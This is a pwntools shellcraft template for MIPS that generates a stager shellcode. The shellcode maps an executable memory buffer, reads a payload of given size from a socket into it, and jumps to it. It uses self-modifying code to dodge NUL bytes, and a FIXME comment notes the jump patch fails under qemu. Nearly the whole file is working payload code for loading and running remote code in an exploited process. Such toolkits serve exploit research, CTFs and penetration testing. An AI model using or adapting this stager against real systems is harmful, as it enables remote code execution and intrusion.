<% 
    from pwnlib.shellcraft import common
    from pwnlib.shellcraft import mips
    from pwnlib.asm import asm
    from pwnlib.util import packing
%>
<%docstring>
    stager(sock, size)

    Read 'size' bytes from 'sock' and place them in an executable buffer and jump to it.
    The socket will be left in $s0.
</%docstring>
<%page args="sock, size"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
%>
${stager}:
    /* Save socket */
    ${mips.mov('$s0', sock)}

    ${mips.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', 0xffffffff, 0)}
    
    /* Save allocated memory address */
    ${mips.mov('$s1', '$v0')}
    ${mips.mov('$s2', '$v0')}

    /* Read counter */
    ${mips.mov('$s3', size)}

${looplabel}:
    ${mips.syscall('SYS_read', '$s0', '$s2', '$s3')}

    /* Increment read address */
    add $s2, $s2, $v0
    /* Decrement read counter */
    sub $s3, $s3, $v0

    bne $s3, $zero, ${looplabel}

    /* Fully read, now jump to $s1 */
    /* 'jr <reg>' contains nul bytes so generate this */
    /* First put int $t7 offset from $ra where to store the opcode */
    ${mips.mov('$t7', 36)}
    li $t8, -0x7350
find_addr:
    bltzal $t8, find_addr
    slti $t8, $zero, -1

addr_in_ra:
    /* Now we know where we are */
    /* Mov the 'jr $s1' opcode into $t8 */
    ${mips.mov('$t8', packing.unpack(asm('jr $s1')))}

    /* And store it */
    add $ra, $ra, $t7
    sw $t8, -4($ra)

    /* This will be replaced by a 'jr $s1' instruction */
    /* FIXME: This should be a nop since 'jr $s1' contains nul bytes */
    /* however in qemu the write looks right but does not take effect */
    /* as thou the instruction cache is populated by the original instruction */
    /* but that should not be the case since it has not been executed yet. */
    /* Perhaps it is a bug in qemu and this actually works on real hardware */
    jr $s1
addr_of_jump:
    /* And this is the jump slot */
    ${mips.nop()}
